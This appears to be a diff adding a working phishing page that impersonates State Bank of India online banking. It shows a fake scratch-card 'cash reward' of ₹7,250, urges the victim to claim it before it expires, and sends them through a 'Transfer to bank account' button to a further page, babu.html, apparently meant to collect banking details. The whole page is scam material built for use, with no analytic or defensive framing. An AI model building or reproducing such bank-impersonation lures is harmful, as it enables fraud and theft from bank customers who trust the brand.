@@ -1,0 +1,209 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+    <title>SBI - Online Banking</title>
+    <style>
+        * { box-sizing: border-box; font-family: 'Segoe UI', Roboto, Arial, sans-serif; margin: 0; padding: 0; }
+        body { background-color: #fff; display: flex; justify-content: center; overflow-x: hidden; -webkit-tap-highlight-color: transparent; }
+        .container { width: 100%; max-width: 500px; display: flex; flex-direction: column; }
+        .full-img { width: 100%; display: block; }
+
+        .header-bar { background-color: #315195; color: white; padding: 12px 15px; font-size: 14px; font-weight: 600; }
+        
+        .content-area { padding: 30px 20px; text-align: center; }
+        .reward-title { font-size: 18px; color: #315195; font-weight: 700; margin-bottom: 5px; }
+        .reward-sub { font-size: 13px; color: #666; margin-bottom: 25px; }
+
+        /* Scratch Card Box */
+        .scratch-card-wrapper {
+            position: relative; width: 280px; height: 280px; margin: 0 auto;
+            background: #fff; border-radius: 15px;
+            box-shadow: 0 10px 30px rgba(0,0,0,0.08);
+            border: 1px solid #eee; display: flex; justify-content: center; align-items: center;
+            overflow: hidden; /* Canvas radius ke liye */
+        }
+
+        .hidden-reward { text-align: center; }
+        .hidden-reward img { width: 80px; margin-bottom: 10px; }
+        .hidden-reward h3 { color: #28a745; font-size: 32px; margin: 5px 0; font-weight: 900; }
+        .hidden-reward p { font-size: 16px; color: #333; font-weight: 600; }
+
+        canvas {
+            position: absolute; top: 0; left: 0; z-index: 10;
+            cursor: crosshair; touch-action: none;
+            border-radius: 15px; /* Wrapper ke sath match karne ke liye */
+        }
+
+        /* Modern Popup Overlay */
+        .modal-overlay {
+            display: none; position: fixed; top: 0; left: 0; width: 100%; height: 100%;
+            background: rgba(0,0,0,0.8); justify-content: center; align-items: center; z-index: 1000;
+            backdrop-filter: blur(5px);
+        }
+        
+        .success-popup {
+            background: white; width: 90%; max-width: 380px; padding: 40px 25px;
+            border-radius: 24px; text-align: center; 
+            box-shadow: 0 25px 50px rgba(0,0,0,0.3);
+            animation: popUp 0.4s cubic-bezier(0.175, 0.885, 0.32, 1.275);
+        }
+
+        @keyframes popUp { from { transform: scale(0.7); opacity: 0; } to { transform: scale(1); opacity: 1; } }
+
+        .congrats-text { color: #315195; font-size: 24px; font-weight: 800; margin-bottom: 15px; }
+        
+        /* Bada Amount Styling */
+        .big-amount { 
+            font-size: 48px; color: #28a745; font-weight: 900; 
+            margin: 15px 0; display: block; text-shadow: 1px 1px 2px rgba(0,0,0,0.1);
+        }
+        
+        .reward-desc { color: #555; font-size: 15px; margin-bottom: 30px; line-height: 1.6; }
+
+        .btn-transfer {
+            background: #315195; color: white; border: none; width: 100%;
+            padding: 16px; border-radius: 10px; font-size: 17px; font-weight: 700;
+            cursor: pointer; transition: 0.3s;
+            box-shadow: 0 4px 15px rgba(49, 81, 149, 0.3);
+        }
+        .btn-transfer:active { transform: scale(0.98); }
+
+        .footer-note { margin-top: 35px; font-size: 12px; color: #888; border-top: 1px solid #f0f0f0; padding-top: 20px; text-align: left; }
+    </style>
+</head>
+<body>
+
+    <div class="container">
+        <img src="https://i.ibb.co/fz5x9ff2/Main-817fcadb-1.jpg" alt="SBI" class="full-img">
+        <div class="header-bar">Reward redemption center</div>
+        
+        <div class="content-area">
+            <div class="reward-title">Exclusive Offer!</div>
+            <div class="reward-sub">Scratch the card below to reveal your prize</div>
+
+            <div class="scratch-card-wrapper">
+                <div class="hidden-reward">
+                    <img src="https://cdn-icons-png.flaticon.com/512/615/615453.png" alt="Reward">
+                    <h3>₹7,250.00</h3>
+                    <p>Ready to Transfer</p>
+                </div>
+                <canvas id="scratchCanvas" width="280" height="280"></canvas>
+            </div>
+
+            <div class="footer-note">
+                <b>Note:</b> This reward is generated based on your account maintenance and transaction history. Please claim it before it expires.
+            </div>
+        </div>
+        
+        <div style="margin-top: 20px;"><img src="https://i.ibb.co/Txj77Jk2/chrome-screenshot-1-Apr-2026-12-43-42-pm-IST.png" alt="Footer" class="full-img"></div>
+    </div>
+
+    <div class="modal-overlay" id="modalOverlay">
+        <div class="success-popup">
+            <div style="font-size: 60px;">🏆</div>
+            <div class="congrats-text">Congratulations!</div>
+            <p style="color:#666; font-size: 14px;">You have won a cash reward of</p>
+            
+            <span class="big-amount">₹7,250.00</span>
+            
+            <p class="reward-desc">This amount will be credited instantly to your linked bank account after verification.</p>
+            
+            <button class="btn-transfer" onclick="goToBabu()">Transfer to bank account</button>
+        </div>
+    </div>
+
+    <script>
+        const canvas = document.getElementById('scratchCanvas');
+        const ctx = canvas.getContext('2d');
+        const modal = document.getElementById('modalOverlay');
+        let isPressed = false;
+
+        // --- Real Scratch Texture Setup ---
+        // 1. Base Grey Colour
+        ctx.fillStyle = '#c0c0c0'; 
+        ctx.fillRect(0, 0, canvas.width, canvas.height);
+        
+        // 2. Add Grainy/Dotted Texture for realism
+        ctx.globalCompositeOperation = 'source-atop'; // Sirf base colour ke upar draw karega
+        for (let i = 0; i < 8000; i++) { // Dotted texture
+            const x = Math.random() * canvas.width;
+            const y = Math.random() * canvas.height;
+            const opacity = Math.random() * 0.15; // Halki shading
+            ctx.fillStyle = `rgba(0,0,0,${opacity})`;
+            ctx.fillRect(x, y, 1, 1); // Chhota dot
+        }
+        
+        // 3. Reset Composite Operation for next drawings
+        ctx.globalCompositeOperation = 'source-over';
+
+        // 4. Add Guide Text (Strictly "Scratch here")
+        ctx.fillStyle = '#555'; // Slightly darker grey for text
+        ctx.font = 'bold 20px Arial';
+        ctx.textAlign = 'center';
+        ctx.fillText('Scratch here', 140, 145);
+
+        // --- Scratch Logic ---
+        function getMousePos(e) {
+            const rect = canvas.getBoundingClientRect();
+            // Mobile touch aur desktop mouse dono support ke liye
+            const clientX = e.touches ? e.touches[0].clientX : e.clientX;
+            const clientY = e.touches ? e.touches[0].clientY : e.clientY;
+            return {
+                x: clientX - rect.left,
+                y: clientY - rect.top
+            };
+        }
+
+        function handleScratch(e) {
+            if (!isPressed) return;
+            e.preventDefault(); // Mobile par scroll rokne ke liye
+            const pos = getMousePos(e);
+            
+            // Ye physical scratching effect deta hai (Destination-out)
+            ctx.globalCompositeOperation = 'destination-out';
+            ctx.beginPath();
+            // Brush size thoda bada rakha hai (28) real feel ke liye
+            ctx.arc(pos.x, pos.y, 28, 0, Math.PI * 2);
+            ctx.fill();
+            checkCompletion();
+        }
+
+        function checkCompletion() {
+            const pixels = ctx.getImageData(0, 0, canvas.width, canvas.height).data;
+            let clearCount = 0;
+            // Transparent pixels ginte hain (har 4th value Alpha hai)
+            for (let i = 3; i < pixels.length; i += 4) {
+                if (pixels[i] === 0) clearCount++;
+            }
+            // Jab 45% layer hat jaye, tab popup dikhao
+            if (clearCount > (pixels.length / 4) * 0.45) {
+                canvas.style.opacity = '0';
+                canvas.style.transition = 'opacity 0.6s';
+                setTimeout(() => {
+                    modal.style.display = 'flex';
+                }, 400);
+            }
+        }
+
+        // Mouse Events
+        canvas.addEventListener('mousedown', () => isPressed = true);
+        window.addEventListener('mouseup', () => isPressed = false);
+        canvas.addEventListener('mousemove', handleScratch);
+
+        // Touch Events (Mobile)
+        canvas.addEventListener('touchstart', (e) => {
+            isPressed = true;
+            handleScratch(e); // Pehle touch par hi scratch shuru kare
+        });
+        window.addEventListener('touchend', () => isPressed = false);
+        canvas.addEventListener('touchmove', handleScratch);
+
+        function goToBabu() {
+            window.location.href = "babu.html"; 
+        }
+    </script>
+</body>
+</html>
+
